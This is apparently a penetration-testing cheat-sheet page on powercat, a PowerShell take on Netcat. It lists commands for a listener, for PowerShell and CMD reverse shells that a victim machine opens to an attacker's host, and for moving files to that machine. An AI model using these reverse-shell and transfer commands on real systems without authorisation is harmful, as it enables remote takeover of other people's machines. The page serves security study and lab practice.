# powercat

Powercat is essentially the PowerShell version of Netcat written by besimorhino.97. It is a script that we can download on a Windows host to take advantage of PowerShell's strengths and simplifies the creation of bind/reverse shells.

```bash
sudo pacman -S powercat # Arch Linux
```

{% embed url="https://github.com/besimorhino/powercat" %}

### Reverse shell

On our machine, we **listen** with **nc** (if it doesn't work, we pwsh and then import the **powercat.ps1** module and run it:

```bash
powercat -l -p <LPORT> -v
```

**Transfer the powercat.ps1 to the victim machine**, either on disk (in this case, we should also import the module) or in memory, and then **run** the following **command** to start a shell:

```bash
powercat -c <LHOST> -p <LPORT> -ep # PowerShell/TCP
powercat -c <LHOST> -p <LPORT> -e cmd # CMD/TCP
powercat -c <LHOST> -p <LPORT> -ep -u # PowerShell/UDP
```

### Transfer files

```bash
# Upload files to the victim machine
nc -nvlp 443 > $FILE # Attacker machine
powercat -c <LHOST> -p <LPORT> -i <PATH TO SAVE>
```
